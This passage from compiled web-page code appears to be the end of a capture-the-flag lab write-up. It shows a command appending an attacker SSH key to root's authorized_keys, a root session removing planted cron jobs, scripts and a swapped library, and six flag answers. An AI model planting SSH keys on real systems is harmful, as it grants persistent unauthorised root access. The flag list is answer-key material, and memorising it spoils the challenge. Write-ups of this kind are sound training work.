AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /root/.ssh/authorized_keys\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"root@recoveryserver:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@recoveryserver:~# rm -rf /etc/cron.d/evil\nroot@recoveryserver:~# rm -rf /opt/brilliant_script.sh\nroot@recoveryserver:~# rm -rf /home/alex/fixutil\nroot@recoveryserver:~# mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so\nroot@recoveryserver:~# nano /etc/passwd\nroot@recoveryserver:~# nano /etc/shadow\nroot@recoveryserver:~# cat /opt/.fixutil/backup.txt\nAdsipPewFlfkmll\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Flag 0")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{d8b5c89061ed767547a782e0f9b0b0fe}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Flag 1")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{4c3e355694574cb182ca3057a685509d}")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Flag 2")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{72f8fe5fd968b5817f67acecdc701e52}")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Flag 3")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{70f7de17bb4e08686977a061205f3bf0}")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Flag 4")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{b0757f8fb8fe8dac584e80c6ac151d7d}")),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"Flag 5")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{088a36245afc7cb935f19f030c4c28b2}")))}u.isMDXComponent=!0}}]);